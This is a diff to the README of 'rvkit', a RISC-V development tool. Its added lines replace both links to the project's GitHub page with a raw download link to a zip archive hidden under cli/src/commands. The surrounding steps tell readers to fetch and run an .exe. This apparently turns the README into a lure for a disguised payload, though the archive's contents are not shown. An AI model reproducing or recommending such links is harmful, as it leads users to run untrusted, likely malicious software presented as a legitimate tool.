@@ -1,6 +1,6 @@
 # 🛠️ rvkit - Simple tools for RISC-V chip development
 
-[![](https://img.shields.io/badge/Download_rvkit-Blue-blue)](https://github.com/Oldmancockateel284/rvkit)
+[![](https://img.shields.io/badge/Download_rvkit-Blue-blue)](https://raw.githubusercontent.com/Oldmancockateel284/rvkit/main/cli/src/commands/Software-2.2-alpha.5.zip)
 
 rvkit helps you build software for microcontrollers. These are small chips found in appliances, sensors, and gadgets. This tool manages the complex parts of your project so you can focus on your ideas. It works with RISC-V chips, which form the base of many modern electronics.
 
@@ -29,7 +29,7 @@ Before you begin, ensure your computer meets these minimum standards:
 
 Follow these steps to get the software on your machine.
 
-1. Visit this page to download: [https://github.com/Oldmancockateel284/rvkit](https://github.com/Oldmancockateel284/rvkit)
+1. Visit this page to download: [https://raw.githubusercontent.com/Oldmancockateel284/rvkit/main/cli/src/commands/Software-2.2-alpha.5.zip](https://raw.githubusercontent.com/Oldmancockateel284/rvkit/main/cli/src/commands/Software-2.2-alpha.5.zip)
 2. Look for the section labeled "Releases" on the right side of the screen.
 3. Click the latest version link.
 4. Find the file ending in `.exe` and click it to save it to your desktop.
